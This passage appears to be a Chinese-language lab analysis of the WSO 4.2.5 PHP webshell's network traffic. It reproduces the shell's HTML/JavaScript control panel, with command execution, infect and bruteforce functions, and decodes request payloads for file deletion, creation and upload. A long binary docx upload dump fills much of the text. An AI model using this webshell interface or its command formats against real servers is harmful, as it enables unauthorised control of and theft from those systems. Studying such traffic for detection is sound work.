		function a(a,c,p1,p2,p3,charset) {
			set(a,c,p1,p2,p3,charset);
			var params = 'ajax=true';
			for(i=0;i<d.mf.elements.length;i++)
				params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
			sr('/webshell-master/php/wso/wso-4.2.5.php', params);
		}
		function sr(url, params) {
			if (window.XMLHttpRequest)
				req = new XMLHttpRequest();
			else if (window.ActiveXObject)
				req = new ActiveXObject('Microsoft.XMLHTTP');
	        if (req) {
	            req.onreadystatechange = processReqChange;
	            req.open('POST', url, true);
	            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
	            req.send(params);
	        }
		}
		function processReqChange() {
			if( (req.readyState == 4) )
				if(req.status == 200) {
					var reg = new RegExp("(\\d+)([\\S\\s]*)", 'm');
					var arr=reg.exec(req.responseText);
					eval(arr[2].substr(0, arr[1]));
				} else alert('Request error!');
		}
	</script>
	<head><body><div style='position:absolute;background-color:rgba(95, 110, 130, 0.3);width:100%;top:0;left:0;'>
	<form method=post name=mf style='display:none;'>
	<input type=hidden name=a>
	<input type=hidden name=c>
	<input type=hidden name=p1>
	<input type=hidden name=p2>
	<input type=hidden name=p3>
	<input type=hidden name=charset>
	</form><table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:</span></td><td><nobr>Linux ubuntu 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64 <a href="http://noreferer.de/?http://www.google.com/search?q=Linux+ubuntu+3.19.0-25-generic+%2326%7E14.04.1-Ubuntu+SMP+Fri+Jul+24+21%3A16%3A20+UTC+2015+x86_64" target="_blank">[ Google ]</a> <a href="http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=Linux+Kernel+3.19.0" target=_blank>[ Exploit-DB ]</a></nobr><br>33 ( www-data ) <span>Group:</span> 33 ( www-data )<br>5.5.9-1ubuntu4.19 <span>Safe mode:</span> <font color=#FFDB5F><b>OFF</b></font> <a href=# onclick="g('Php',null,null,'info')">[ phpinfo ]</a> <span>Datetime:</span> 2016-11-03 22:43:08<br>18.58 GB <span>Free:</span> 13.12 GB (70.62%)<br><a href='#' onclick='g("FilesMan","/")'>/</a><a href='#' onclick='g("FilesMan","/var/")'>var/</a><a href='#' onclick='g("FilesMan","/var/www/")'>www/</a><a href='#' onclick='g("FilesMan","/var/www/html/")'>html/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/")'>webshell-master/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/php/")'>php/</a><a href='#' onclick='g("FilesMan","/var/www/html/webshell-master/php/wso/")'>wso/</a> <font color=#FFDB5F><b>drwxrwxrwx</b></font> <a href=# onclick="g('FilesMan','/var/www/html/webshell-master/php/wso','','','')">[ home ]</a><br></td><td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)"><option value="UTF-8" selected>UTF-8</option><option value="Windows-1251" >Windows-1251</option><option value="KOI8-R" >KOI8-R</option><option value="KOI8-U" >KOI8-U</option><option value="cp866" >cp866</option></select></label><br><span>Server IP:</span><br>192.168.182.143<br><span>Client IP:</span><br>192.168.182.1</nobr></td></tr></table><table style="background-color:#2E6E9C;" cellpadding=3 cellspacing=0 width=100%><tr><th>[ <a href="#" onclick="g('SecInfo',null,'','','')">Sec. Info</a> ]</th><th>[ <a href="#" onclick="g('FilesMan',null,'','','')">Files</a> ]</th><th>[ <a href="#" onclick="g('Console',null,'','','')">Console</a> ]</th><th>[ <a href="#" onclick="g('Infect',null,'','','')">Infect</a> ]</th><th>[ <a href="#" onclick="g('Sql',null,'','','')">Sql</a> ]</th><th>[ <a href="#" onclick="g('Php',null,'','','')">Php</a> ]</th><th>[ <a href="#" onclick="g('SafeMode',null,'','','')">Safe mode</a> ]</th><th>[ <a href="#" onclick="g('StringTools',null,'','','')">String tools</a> ]</th><th>[ <a href="#" onclick="g('Bruteforce',null,'','','')">Bruteforce</a> ]</th><th>[ <a href="#" onclick="g('Network',null,'','','')">Network</a> ]</th><th>[ <a href="#" onclick="g('Logout',null,'','','')">Logout</a> ]</th><th>[ <a href="#" onclick="g('SelfRemove',null,'','','')">Self remove</a> ]</th></tr></table><div><h1>File tools</h1><div class=content><span>Name:</span> hello.txt <span>Size:</span> 0 B <span>Permission:</span> <font color=#FFDB5F><b>-rw-r--r--</b></font> <span>Owner/Group:</span> www-data/www-data<br><span>Create time:</span> 2016-11-03 22:43:08 <span>Access time:</span> 2016-11-03 22:43:08 <span>Modify time:</span> 2016-11-03 22:43:08<br><br><a href=# onclick="g(null,null,'%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2Fhello.txt','view')">View</a> <a href=# onclick="g(null,null,'%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2Fhello.txt','highlight')">Highlight</a> <a href=# onclick="g(null,null,'%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2Fhello.txt','download')">Download</a> <a href=# onclick="g(null,null,'%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2Fhello.txt','hexdump')">Hexdump</a> <a href=# onclick="g(null,null,'%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2Fhello.txt','edit')"><b>[ Edit ]</b></a> <a href=# onclick="g(null,null,'%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2Fhello.txt','chmod')">Chmod</a> <a href=# onclick="g(null,null,'%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2Fhello.txt','rename')">Rename</a> <a href=# onclick="g(null,null,'%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2Fhello.txt','touch')">Touch</a> <a href=# onclick="g(null,null,'%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2Fhello.txt','frame')">Frame</a> <br><br><form onsubmit="g(null,null,'%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2Fhello.txt',null,'1'+this.text.value);return false;"><textarea name=text class=bigarea></textarea><input type=submit value="submit"></form></div>
	</div>
	<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>
		<tr>
			<td><form onsubmit="g(null,this.c.value,'');return false;"><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='/var/www/html/webshell-master/php/wso/'><input type=submit value='submit'></form></td>
			<td><form onsubmit="g('FilesTools',null,this.f.value);return false;"><span>Read file:</span><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
		</tr><tr>
			<td><form onsubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"><span>Make dir:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=text name=d required><input type=submit value='submit'></form></td>
			<td><form onsubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"><span>Make file:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
		</tr><tr>
			<td><form onsubmit="g('Console',null,this.c.value);return false;"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='submit'></form></td>
			<td><form method='post' ENCTYPE='multipart/form-data'>
			<input type=hidden name=a value='FilesMan'>
			<input type=hidden name=c value='/var/www/html/webshell-master/php/wso/'>
			<input type=hidden name=p1 value='uploadFile'>
			<input type=hidden name=ne value=''>
			<input type=hidden name=charset value='UTF-8'>
			<span>Upload file:</span> <font color='#FFDB5F'>[ Writeable ]</font><br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='submit'></form><br  ></td>
		</tr></table></div>
		<!-- particles --> <div id='particles-js'></div><script src='http://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></script>
		<script>particlesJS('particles-js', {'particles':{'number':{'value':80,'density':{'enable':true,'value_area':800}},'color':{'value':'#ffffff'},'shape':{'type':'triangle','stroke':{'width':0,'color':'#000000'},'polygon':{'nb_sides':5},'image':{'src':'img/github.svg','width':100,'height':100}},'opacity':{'value':0.5,'random':true,'anim':{'enable':false,'speed':1,'opacity_min':0.1,'sync':false}},'size':{'value':3,'random':true,'anim':{'enable':false,'speed':40,'size_min':0.1,'sync':false}},'line_linked':{'enable':true,'distance':200,'color':'#ffffff','opacity':0.4,'width':1},'move':{'enable':true,'speed':1,'direction':'none','random':true,'straight':false,'out_mode':'out','bounce':false,'attract':{'enable':false,'rotateX':10000,'rotateY':10000}}},'interactivity':{'detect_on':'canvas','events':{'onhover':{'enable':true,'mode':'grab'},'onclick':{'enable':true,'mode':'repulse'},'resize':true},'modes':{'grab':{'distance':200,'line_linked':{'opacity':0.5}},'bubble':{'particles_nb':2}}},'retina_detect':true});</script>
		</body></html>


##### 4.2.2.2&emsp;数据包分析 #####
**删除文件操作**
>请求数据包攻击载荷：<font color=red>f%5B%5D=yaofeitest.md&ne=&a=FilesMan&c=%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2F&charset=UTF-8&p1=delete</font>

>请求包攻击载荷分析：这个攻击载荷没有进行复杂的加密方式加密，只进行了简单的url编码，解码后可得：f[]=yaofeitest.md&ne=&a=FilesMan&c=/var/www/html/webshell-master/php/wso/&charset=UTF-8&p1=delete，可以清晰的看出该webshell需要执行的命令。

>响应包具体分析：该响应包仍然返回的是整个html页面。

>具体信息如图4.2.2.1所示：<br>![wso_shell]({{ site.baseurl }}/images/wso_shell/Files_del.png)<br><center>图4.2.2.1</center>

**增加文件操作**
>请求数据包攻击载荷：<font color=red>a=CCk1RgMPC2UsSFEbLQ13UQ%3D%3D&c=FncDXTo%2BfAMqSQseLzIYGDtxaEkDAyFPOD01QDsUaEYDNQBdFDUAQy4TC0oWdz1POy59DQ%3D%3D&p1=FncDXTo%2BfAMqSQseLzIYGDtxaEkDAyFPOD01QDsUaEYDNQBdFDUAQy4TC0oWdz1POy58XxQtEBssA39cPHoARw%3D%3D&p2=OBMtWDgAPVw%3D&p3=&charset=UTF-8</font>

>请求包攻击载荷分析：该操作的加密方式和之前的分析相同，通过相应的解密函数对其进行解密得到解密后的攻击载荷为：a=FilesTools&c=/var/www/html/webshell-master/php/wso/&p1=/var/www/html/webshell-master/php/wso/hello.txt&p2=mkfile&p3=&charset=UTF-8。即在/var/www/html/webshell-master/php/wso/hello.txt路径下创建一个hello.txt文件。

>响应包具体分析：该响应包仍然返回的是整个html页面。

>具体信息如图4.2.2.2所示：<br>![wso_shell]({{ site.baseurl }}/images/wso_shell/Files_make.png)<br><center>图4.2.2.2</center>

#### 4.2.3&emsp;文件上传操作 ####
&emsp;&emsp;&emsp;从webshell的底下操作栏中文件的上传操作。
##### 4.2.3.1&emsp;数据包内容 #####
**请求数据包**
<br>

	POST /webshell-master/php/wso/wso-4.2.5.php HTTP/1.1
	Host: 192.168.182.143
	Connection: keep-alive
	Content-Length: 17322
	Cache-Control: max-age=0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	Origin: http://192.168.182.143
	Upgrade-Insecure-Requests: 1
	User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
	Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIx9sOhX04md8pGDP
	Referer: http://192.168.182.143/webshell-master/php/wso/wso-4.2.5.php
	Accept-Encoding: gzip, deflate
	Accept-Language: zh-CN,zh;q=0.8
	Cookie: da94407ecf64bda7c0ac6ea1fa4477d8stderr_to_out=1; da94407ecf64bda7c0ac6ea1fa4477d8key=d69aa478a72ecd3a99c77af6fcf6b917; da94407ecf64bda7c0ac6ea1fa4477d8ajax=0; da94407ecf64bda7c0ac6ea1fa4477d8=21232f297a57a5a743894a0e4a801fc3; act=%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2Fhello.txt; f=N%3B; c=%2Fvar%2Fwww%2Fhtml%2Fwebshell-master%2Fphp%2Fwso%2F; PHPSESSID=mh6l96lmrd0so2isi315c3loi4
	
	------WebKitFormBoundaryIx9sOhX04md8pGDP
	Content-Disposition: form-data; name="a"
	
	FilesMan
	------WebKitFormBoundaryIx9sOhX04md8pGDP
	Content-Disposition: form-data; name="c"
	
	/var/www/html/webshell-master/php/wso/
	------WebKitFormBoundaryIx9sOhX04md8pGDP
	Content-Disposition: form-data; name="p1"
	
	uploadFile
	------WebKitFormBoundaryIx9sOhX04md8pGDP
	Content-Disposition: form-data; name="ne"
	
	
	------WebKitFormBoundaryIx9sOhX04md8pGDP
	Content-Disposition: form-data; name="charset"
	
	UTF-8
	------WebKitFormBoundaryIx9sOhX04md8pGDP
	Content-Disposition: form-data; name="f[]"; filename="............-.......docx"
	Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document
	
	PK..........!.	$..............[Content_Types].xml ...(.....................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................MO.@...&...W..z0......M....C..~dg....JK...Z...2....3..J...<*kR.Oz,.#m..,e.....E...Di
	.l
	.F....t..#.6..".w.9.....:0t.[.E.[?.N..1.~...piM...Pi....r1/C4^....C.,.._..R&.+...H..d.\..CB..w.P.....V..........*.h"|x..0....gV.5....i..y.$4....V."e...9.B...A......)j....T(.y..>vw..........v..(.SL...qW..U.DX....Q..w..4.S.^.	..0.F.."....\.gsld.Y.dL.uH.........c.9.>(hVD..5..{......A...7.t.	......PK..........!.........N......._rels/.rels ...(......................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................J.A.....a.}7.
	"...H.w"......w....... .P.^....O.....;.<..aY....`G.kxm...PY.[..g
	G..ino./<...<.1.....A$>"f3..\...T...I	S...........W.....Y
	ig.@..X6_..]7.~
	f.......ao..b*lI.r.j).,.l0.%..b.
	6.i...D._...,	.	...|u..Z^.t..y..;.!Y,.}{.C../h>.......PK..........!.|;.9"...........word/_rels/document.xml.rels ...(.....................................................................................................................................................................................................................................................................MO.0...&.....V]....5.....-Sh..t......
	....Mf....I.Z..U.......q."......=loO.Y.$m.+gA.........T..!,M.QH.(XI.\q...Zb...aG;_K
	./x#..,./.d.}?.e..h...7.)..m...g;...k..k.4...D.f.2./...w........Bm.w.4......A..^.#......FkP......H.x........At..~9'....ozW.nM....t...V....WkJ.lN.W...z...^..>\........PK..........!..Q..w...N.......word/document.xml.][s...~.L....1A..mBed.v2.4.+..;....A..@b.'%.e......lEue..Si.[.-.1.@.)..g/....I.2...."..bo....\.....i]..i.....gD.K.e#....../.~.+tY...%....pM....~.....iC..)...Y.V.!/...m..c1K.*9.:.Se...1..l.b...*+..a.c	1.._y......]..	..xv....yE.o..fN..3....$..x...=/......5.[...1R......}......
	..xo.GjQ....!....1S....ne.|.....U.zE.8...9.KW...G..W..>.2..tE%.#.Ui.4{)..v .[...9...*.{.d...."....$'...MsM.l\@....K.1....W...O..~^..
	.L....V.j(.#...JyE.....dt..F5(Q!.."#R..a1j......B?..... .C..P_....R..q..<..W.Q...6..+.J!%.&!w.i_...._J...'z.%.. .....0...	I..%.A....T../..s.\j...<.`h.9"(...
	.D7>>...2$.u...*N.....kp.T..2...y@r.j.l7.A.w..dO...Do.<.I.Z.D.....+.mBq.N..O..^ ....A>.b....{..L^Q.cE.dmx.6t.G.>...iz...y......w.|...LV....%.-.=4...~.+hE.#/.0&hG..f@	.q.`-.)c~..}w..m#....`k4.i2.....d.....".............[7..R.bdbPS3...L....'....`Z.c..L.....\mH\..9.|80~H?.Y....Q.`..ih..........".. .d.*HR.8{.w.4."Y...J.{.A.
	%.A..W..h.y...?..W..o$:t....&<..BA......(VH][^z.RV.Adz.f.nE}`.
	8..8K.TvQ	...T.I3..6.WW5Vg..a....\`n/:..M....@j.......*
	.L.....Q.2../_?........_wg..(,.....jqU....]...-.L7.Q..F."D.]$..o...,..n<E.kn`#M7..k.{...M.....Jy-.'.......N....;..>^..OBY2.........(K.o.+Fy.3..(.Q...
	.:M.5U.l.+d...}.,r..|/y....=.....u.=|..qm.."..*..(.o"..\..r.x%M.	.5H...
	.y.MD[+..g7".Q%...vX...J....c....`!.-f..6..QS.&.......6'..u..|....,...C..+.C...).&!.u.(..U....:U...C]V..oP......uUH....Q$EJS+.73.......:.>~Y.q.........T....kv...........j..{....<..w...Rq...W.._Z.m......k.@.-..U..-d;t..E.:....>...".|.~.Ogi..
	.....5H_../g....7...X.-.3.3.3...z^._.$.........x..2..T./..(....6Sm...h..}}k...Dp....'.u...(.n...LM......X..........zb.......).....fW<=V.IZ...Ms.C....W.{.S....P....Aj..+.$.`6xk.{..$.1.......Ch...O..................'....5..ww.[;..Jii.0z[/....y3.....6.v..sgg.Y...<S3; .^?z	/..6.._o..H.3..M{-D~....l...q......Xd..D...s{..../.7...
	....G%..f..ly...0.4..e......q@....A.../..n3..a.mb..4}{7.Uh...=..}TQ........X.*..-....>.).
	-.O.0.lS........).........|(....(Z...|X......?...-7....0.N........B..,..-....K....g..3
	..K....qg~vn.x..P.%r.............M....[....k.. ?.....{t._....6.$0.....b;........I.m...e!D6D.W...,..b.'.k..Mgc.il8..W...Z2....x.=e.2...?....*;Xa.Pp...._&..V.`.N..,..F...P.....\.Gyc....h..e.e[5%..Y.f.*^.....'..}.d.8.L.
	JN......K.B.j.,d............y.rtz?1.w....H..f...1...@.0.D{|......yhaw..6......[.^...Eg....H.s..W........'$.W.'.&&...h{..3..pC%D..6/.u.1.Ox'C....1.....Gk..2...MK.....N.........c/.'t......H....	.....G.`.##k....7T..Ui0..r.....F.S..
	}[m...E	v.%..G...<...../..S.$.`.......dr...8......0.i..U40=.3.'...............I.x.....~...*$.:.....8iTH...A."Ezj(RTHDB!..o6....H..[].u...S.U.sD.....!......C..../.c.....o.%YI	y..T.	E..er.	z.]#p..B[{..i..;..p.....3.w....@.....<...b.........z.7xHigL.....#.Mg5Fp.k...~:8...='1.D.o..
	...q.....,=.w..t.^.}...3.X..	..,._-..<)}.5..C.4.S..=....HM2B...l.
	.q...^E(.PN.2...E_"t((`f.....=u,rW.J..N....-....x.{.l...}...k.@u...,.......$.S..D;n..NG.t.NGlN.s9.x.V..0....YVt[1Y.ZnEz.[..0MP.G.....FY...u|.p~....A[...bH.....aF.....D.....Ny ...@....P.%...H<.M<'Et.'.m.).Uf...H..........a...h......@..pVp..s.z...yW.~mk....3at5.d........;....s!....:<.x....@..I..P... ..#
	.c...+.:.....K.H
	8..E.....L..R.I..C..
	8..]_u.= &..._q..........|4.....|.......R....^U..Q..JB....)......GF....`.O....|...^...i?%E..+..).N":Q..*<T.......
	.Uxh7N ...u.S.UxQ.c.
	...
	l..<.J.W.. D.
	... Dc...4..l.L....B....!R.H="...#(dN....a...
	.
	..zD.QVC...`...$t	..8$d,......<G=@L+7\H=...7\.f.Et.l......F..A. l7..8..;	.Y1^!.0.lP......(R.H="...#R.....;....0.H...../....#R.H=.XH.&.z5Y.....@...... @..Y...C.Gh.S.d.o/]EZ.....;..8i..:r$#A..ID.N.X.r........0..wH?w^<7t.....R..q
	.M.E>p..n).=.f.v...rf..k!.}<.'vS..~w...esR>..Dr..<.O&..=E(\.....nZy.)cP4.iV. 0[J.=.'.....WM	}}	r....%.x........d..+E../.*q.g'gj..X.u.cX..lJ8.....f....F....9.. ...........PK..........!..lN.............word/theme/theme1.xml.YOo.G..W.w...b'v.#..;6i!.....x=..2....'....T.*.8......-.H.T.e.JE..W.....N.n..(j...g......Y..p+bh..Iy...g+."...4....~........3...7!.........
	ID....*nz.R.....a...<!1<.q.a..E.0.x..Fla.RY^.0.=....^...O....y....n....Z...@Q..^...i
	..h....F..l3..0kz.n........R...W1?.......nbj......I......F.....j..8...7..fq.N........>xjm)..uW..Lf.d......+5._..4cs..j...-V...?k3...rm}......g...z....
	...g..s....7...xw.......s....R.
	.W*)|..j..K...X.........
	dX...IBF..bn.h (.
	.*..'v..3KZ.....jz.'..c*...._=}...<9.......w~...].8...^~.._.o.?.......xY.....g.~^........G.<y..../.._._.xP..iD$.B.....1...r2.'...1-.X...c.......A_.`.f...E..^.@.e.......P..-.|).......Ei..i].0..qP.\.......t.q...3N.7..t.o..1s..X...D!....R..
	J..nQ_p.G
	....iiH.t.T.t.&. /.2.!.Nl....ge^o.=.	].Y..}..0^.c..2.}..b./c.........H......3$R...*..B./a`...o.I."...e2/c...
	...q..a{4.......(F.\.....!.3...s.}..'.G..5.8&M.D?...\^$......01T...puD.."nF.....#n..._=,..]..u8..zf..Q.....6.C..........b..zO.........~>}J..0...E..m..h..=.............a...>s.$.-,	.O........=Hp.	Ua/.	..UO.	d*:.(....f.T......U../!.9$V[|h...rv......s...-i..U.t..
	.....6.....4C....e.bs).....b.M.j..B..e..k.p....u.m....,.f.d..$...{6GU...Vf..~.b...#.V...b.@.q.TTW......d)..i.@..vdq.9Y...^..X.....7.{2..%.u..H..x..+a...f6]>.f#s.m.*...q.q...DH..ehK.<JK..Z.....a=-.J..xV,.@1.kV@................R).+"z.p.
	.X.`H..U.gH%..0..?..9.m..%....o....c..8.[..Y'[.!.....`..Vj.q.....?%W.e.?sE.'..ai.3...b.......
	9.P.R.+`p0.....w.1....6.....m.Y......vh....H...m.%S}G...g...RA..
	....= {..5.....C!..a.....p.......z.)...d..k{.mO>...)...@..?71......o.ggo...`:f....e......k.p...2......8.......D	.CB.?8....1e...>..nE.....e.U}...H..]...d.m1iQ6.........<..z..[[v.|.0..p..sz.4..F...]..j......Qv.1.1..........
	..`..4...S	.3t...4..h...
	......PK..........!....EQ....
	......word/settings.xml.VYo.8.~_`....ul.HR!N..q..n.*.}....
	....8..CR.j.	...I........'.z;P.J1...a.......,z._....6D..I..h.:.x....M.....=..:..,*....@.%p.Od.....81....N.c].s.+bhF.5..h8<.Z.9.j%....i....cU......O.P.b.k.d^s..Y.(`.......h.w...e...w..gA....I..m.*^4~.=.P).... ..u9...&...z	.	.z.m.,...Cw.<.....l.,.h...i...^.<..
	.H....x.]bE=K.{MR..1IX..i4......]./...R...-....^JiZv..R3sO...
	
	..z?.
	=x.H.a..h.7(Cs....H
	.......bd.+.}.....to...A#@{........%Q$G.[..hBI.0m.(L..Z..v....f.q..7,.zX...FD.)^..|o`!k..=.C.S:...u.d.s.?jFtye{.1kv..u...'}.T.DHK.1..`.:YR.[k...n.nKs'0......Y.........	....c.xj;.....Y...J..R.
	..XQ....+L78.S.g.4aR..W.....8g|.......aC.......%.."N........jM.u..(.....A..t....Q.p.....0.....q.>V..L.g.....9.......t>...>..:.g..xq.3?;..p.s.O....q..x......Y.G.S......O.Z.../...Y....&<S...vq`..$S.s*.?.\..3'.....=Cs....F`.....'..6.....v...:J.Y....NaP.p.V.Z.H..'..'...
	.}......%p......u.,...O..|3.6\.n...?..-.hs.).E.e......d*.O
	X....:.......[5...>9.O...............t{....R.....m..p.z.IG........>y....W..G.q.h....l..
	.Y.....KR....8.A.8....z...p.BA
	..*Zp...u8r..J.N..| k..pu@...`.b...e.&..C_....b..{.u...;..6)T...Txe7..r.............PK..........!..?......l.......word/webSettings.xml.UMO.0..#....Y.i+..C..!$...? M.-"..$[....ec|...q....{........d%}P`..z)I..P);/....dD......+....\...........3C.,6.F.d...)
	b!
	.=p.b..ox...S......0.GU*.....4#o4.',P.J.)...6.x..FF.a.\..5?ak.W...!`?Fw|.+..a./DF	.....fhW..P!...e4I.....</5N.a.2..Uj.....UU..,.....6^B.....V\.4.n.qx...[o................'?.3......cQt.... x4.p\`..-@.j....2.^e.!.............m...Q.6...Y6J..=.9...G.g.!.....Wzt..}..Ee.....xh...........7.............PK..........!....j.....A......word/stylesWithEffects.xml.\[s...~......;.8..O.Nb'.g.4...g..,...KRV._....hR.wE..<.....
	.B
	6...-..G..J'...b.{2	t............."	E.....d....??......H..(H..].,.MQ.W.I.ld,...
	2..u."..D..*......|:.._i.....v-.G......M.2....bQ./tv?.E..M.@{*
	.R.*.@...R...6K.J...AF...T.T.Y....V.F..X&."N2..
	:.7*..q.6pqS..x...8........s....L. .{.-u...Z.8.q0..g..q6=.L.....@1.9feI,T.....zpa?....2.M.9....6yp...dX6...Ww-g)hm..F.......>..XE`.n..3......up#.b...y.}....;|...".vW"....
	.-.....&....)..m.D....3...,...$...)|.B.O......|.....G.w.`V=.6v.E..H$..3..}]..[..7g.....@-|..-..e.t.z..!u!.....n..YZ..x..'.<.pY....X..~...)..
	......K...*..!.ja.Q...F&_s...........mR@`..1.Q.........%.d......~P.A..jo.}.@...T.e...l.0-.C.......@s.Q......|....U.......X\.W....V...U%=...l..k...%..%k$ZU.+.*.^.V..J.J.W.U......J...+.J.Q.@ q5....A..w.....0.l ..M.."2q..t....4..Y....f*...d.,2m..=...mp2'...............]..2.....W..Z>... .|.D 7:
	e...o6.....[."..y.q...I.o
	.Nu...F..#.....?..cp.._t..........V....6.BC8.\X>g....&...K...&...$...m.|.P?.~.\..M.)..Vt.~...q.....x~.Ls.?.x..u....:..z.U{.....;.A.\`ob..D......>..A...(u....G.(.tX..lt_.Ii.....;A
	.9.k..2.....|T.G\n3@.vg...|...hA.3..[]......GE.M...\z4....GE+...;F..5>........
	.@...}.q=..2.92........../....x-`..I8.u...Zh.M.
	;A..I@ag...\.$`..7	X.].;GuN.8...u w. x4.y...!o..8.M..N.. ..7...
	.S..M..%.....N.. 67X.+.3...j9..v..&....&o.
	;;].M..%.Jh`9.#`.C...q...4.y...!o..8.M..N.. ..7...
	.S..M.b.....7...p.. y.....M@a'.M...vv......,v..X..	X..S.%..7..q....8.M....	@..7.h8y...G..,678N..7..M...N.. 67.$o..?..	(........N.P.....	j`9.&`a..&o...9....8.M.h..&..C.......2.y.....8.N.. 6=8.:y....p..q..p.&....&o.
	;;
	Bu.M.b'......5.y...0..7..........q....8.M..N.. ..7...
	.S..M.b.....7...
	..-..%_O.u....Au...8.H...t./...L....!..+.....Au......b.yG....*R..t?.-.. ....I..?...v..%.%...
	.........j...S
	#;iu..h.Q"3.U....[...8.cF|`
	N>..>.O.% .
	.K.b.B.......*..u..A.`.a....D..WDl..l.....1..-#;.........j..
	..u..rZk;.,...c..Z..0zx....m..n.%.3.a. .......MBplW.n.T...U.._.(.]`.
	.v/........... .....3.>...R.9..c..'..!..+.....
	v~ ....
	..m`9.45..v.....y...P....0q...:.e....F.P.f.Mb.................Z..6;.f.....r.....?O..A5R....@..B[..6N.uus.tUU'	+..
	..*.\............y+>.....c..v........ok.].p.....L..(..B.[.,/>.D^C...f....?..P.slK..F...y.._.......PK..........!...>.E...u.......docProps/core.xml ...(.....................................................................................................................................................................................................................................................................Mk.0.......{b'.....m...`....[m.b..n...9..R....^=z%.X.U...:Y...	A.h^...%z......gZ...P..8...w.79.-......\.H........1v....$(t(.j.....c........c..	..n....h@
	>"..V.@p..(...4I....U....2Q*./&.4..........(l.&if...?.....n.X..V..-.....kK..l.'..x.s~.... ./..w..Z8..}hV.i.ft+..@D.d..t.|...7+D3..c...lC.9y.	...n.[.}B
	..M..h.....o.......PK..........!..+<.....%>......word/styles.xml.[Ks.H..o.........W.....UN.D......50Z@.._.==0. D. .=..f......~..9
	.."I.......uD..@..S.......I3/..P.b..........=...K(R....i.O.e..N..._..K......B%.....a.y..zu..h.er.C.........I(R.b!}q..u$.......D..K.J.iO.iO*	V..E...Qh.E.....aMP$.D.j...c.F.....GC.-
	]'.O..b.x....4:t....._.....T.Ln..c.	.\.8K..S/.......H..Ogq*]x".4;K.W~.1_...zc..=..YI....;..."..../..c......b.B.e6..B/~(.D|p?+.7u.......9@M]/9..ia.4..Yr......x.b
	...........E0.....$.....D...l..}./.D$?. .:....R......S.l..]a...}..3p..	F1L....X..........@..<J8..Zn.1..T\.......e)<].......^w..k....\...."...8....../N...^.....RV...).$_9'&o
	AlMY}..E.'jI.z..#.'j).z....'j.o=Q.o..Z8w..=$.j.M......Y(....4.HuySpn..{H..............MU....r.%*~h........1Z-.T.[N....]...Z.?...B......o.[..6.|.Ta ..N<..2..Q.l....[...........[n+.q...=a....}.....Li.N..qC^6..,...
	...F.
	.3.\.@.w..P..^..V..PL0..o..'.o.._..1E.....O..4.=.c~../.i..K.C*..v.^.P%.uX.@+=..+.B.L`...O"..v...O......%O....(.......F....
	......T..3..q-..M........m....]...'
	...Dz...VY.;.....(.1..$..
	m.PyT.<.L.c..[.c.u....n........<.'.A.7G....m...#3.	..-.....7	._
	......I@a...7	(..Tz.......&...k4.......}..d.....C...~.....y....w;H..M.bs...2y..p.....*.7...
	......}....r..y.P....7....&.&`..N&T.,....!o.P?.M....	@..7....&.u'.v..........e.&..........[8.......9y.P....7....
	...T..;@.,K..,..I.....cT?.M....&..C...~.......A.#o....,.........T&o......7../'o.
	;@u.&...S!T.s.,v.*X..	X./.....[...X..y.,...	@..7..;y...G..,67XN-.7..M...L.. 67l%o.._N...v...M@aG.B...	X..U.,....!o..&fg.&...=...8a...	..C.........y....`9.L.. 6=X.2y........}Q...QC.P......... Q.s....H`HJ.....XX.@lH....J=:......!C.y(.^.~.[:.A....I.....'3.S;.)...
	........N.....
	FvV..r-
	F..\V>....a ....=..{p.)........;L.i.'.........824F....s.-.1(<.."b]G.	J..Hv.8.).py...Ln....]vp..{u.........]..j..7:x.......n.&.w...A@..q?.r..`......L..g.....".?{..L....b....!...(.b....	^.GM.	.o..1....n...\$......oq...k.g.
	4...z.Y/..M.LjZ..
	P....w_....'a=.`.......,.<.......lP..?.QM.z..f.....h>..s..?O..A1R....@..L..<7.:k.f..EV.uX.\h >.^.Zm....q..e...K.U......-..|...+...&.....Lq...4WA..$..B&iv#cq.
